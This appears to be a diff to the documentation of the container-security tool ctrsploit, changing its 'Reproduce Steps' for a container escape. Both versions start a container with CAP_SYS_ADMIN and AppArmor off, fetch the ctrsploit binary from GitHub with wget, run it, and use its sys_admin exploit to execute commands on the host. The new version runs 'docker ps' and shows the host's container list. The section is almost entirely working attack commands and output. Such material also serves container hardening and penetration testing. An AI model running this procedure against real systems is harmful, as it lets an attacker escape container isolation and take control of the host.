@@ -100,15 +100,17 @@ WARNING: No swap limit support
 
 ### 5.2 Reproduce Steps
 
-```
-root@ubuntu:~# docker run -ti --name poc --cap-add CAP_SYS_ADMIN --security-opt apparmor=unconfined ubuntu
-root@8dfc14e5321a:/# wget https://github.com/ctrsploit/ctrsploit/releases/latest/download/ctrsploit_linux_amd64 -O /usr/bin/ctrsploit
-root@8dfc14e5321a:/# chmod +x /usr/bin/ctrsploit
-root@8dfc14e5321a:/# ctrsploit --colorful checksec sys_admin
+```shell
+root@localhost:~# docker run -ti --name poc --cap-add CAP_SYS_ADMIN --security-opt apparmor=unconfined busybox
+/ # wget https://github.com/ctrsploit/ctrsploit/releases/latest/download/ctrsploit_linux_amd64 -O /usr/bin/ctrsploit
+/ # chmod +x /usr/bin/ctrsploit
+/ # ctrsploit --colorful checksec sys_admin
 ✔  cap_sys_admin	# Container can be escaped when has cap_sys_admin
-root@8dfc14e5321a:/# ctrsploit exploit sys_admin ra -c "hostname"
+
+/ # ctrsploit exploit sys_admin ra -c "docker ps "
 INFO[0001] 
 ===========start of result==============
-localhost.localdomain
+CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES
+059c89ef2556        busybox             "sh"                49 seconds ago      Up 48 seconds                           poc
 ===========end of result==============
 ```
